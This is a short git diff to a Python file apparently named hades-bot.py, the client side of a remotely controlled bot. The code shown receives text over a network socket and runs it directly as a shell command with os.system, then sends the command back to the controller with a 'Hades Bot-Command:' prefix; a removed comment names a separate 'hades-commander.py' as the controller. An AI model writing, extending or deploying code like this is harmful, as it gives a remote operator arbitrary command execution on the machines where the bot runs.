@@ -57,8 +57,8 @@ class Controller(object):
                     cmd_read = client_socket.recv(buffer_size).decode()
                     print(host_format,end='')
                     airbitrary_cmd_exec = os.system(cmd_read)
-                    bot_command = client_socket.send(cmd_read.encode())
-                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Command Executed->{bot-command}")
+                    bot_command = client_socket.send(bytes("Hades Bot-Command:",'utf-8')  + cmd_read.encode())
+
         except Exception as Err:
             print(Err)
             print('\nUsage for help: python3 <hades-bot.py> -h ')
@@ -96,4 +96,3 @@ if __name__ == "__main__":
     banner.join()
     listener.start()
     listener.join()
-#Controll this bot using the hades-commander.py
